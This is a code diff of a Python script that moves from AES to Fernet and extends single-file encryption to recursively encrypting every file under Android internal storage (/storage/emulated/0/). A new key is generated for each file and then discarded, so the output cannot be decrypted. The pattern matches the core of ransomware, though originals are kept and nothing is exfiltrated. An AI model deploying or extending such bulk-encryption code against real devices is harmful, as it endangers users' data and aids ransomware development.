@@ -1,47 +1,37 @@
-from Crypto.Cipher import AES
-from Crypto.Random import get_random_bytes
+from cryptography.fernet import Fernet
 import os
 
 def encrypt_file(file_path, output_path):
-    # Generate a random 256-bit key
-    key = get_random_bytes(32)
-
-    # Create AES cipher object
-    cipher = AES.new(key, AES.MODE_EAX)
+    # Generate a Fernet key
+    key = Fernet.generate_key()
+    cipher = Fernet(key)
 
     with open(file_path, "rb") as file:
         plaintext = file.read()
 
     # Encrypt the file
-    ciphertext, tag = cipher.encrypt_and_digest(plaintext)
+    ciphertext = cipher.encrypt(plaintext)
 
     # Save the encrypted file
     with open(output_path, "wb") as file:
-        file.write(cipher.nonce)
-        file.write(tag)
         file.write(ciphertext)
 
     print(f"File encrypted and saved as {output_path}")
 
-def find_internal_storage():
-
-    directory = "/storage/emulated/0/"
-
-    if os.path.exists(directory):
-        return directory
-
-    raise FileNotFoundError("Internal storage not found")
+def encrypt_files_in_directory(directory):
+    for root, _, files in os.walk(directory):
+        for file in files:
+            file_path = os.path.join(root, file)
+            encrypted_file = file_path + "_encrypted"  # Appending "_encrypted" to the original filename
+            encrypt_file(file_path, encrypted_file)
 
 def main():
     try:
-        internal_storage = find_internal_storage()
-        file_to_encrypt = os.path.join(internal_storage, "example.txt")
-        encrypted_file = os.path.join(internal_storage, "encrypted_example.txt")
-
-        encrypt_file(file_to_encrypt, encrypted_file)
+        internal_storage = "/storage/emulated/0/"
+        encrypt_files_in_directory(internal_storage)
 
     except FileNotFoundError as e:
         print(f"Error: {e}")
 
-
-main()
+if __name__ == "__main__":
+    main()
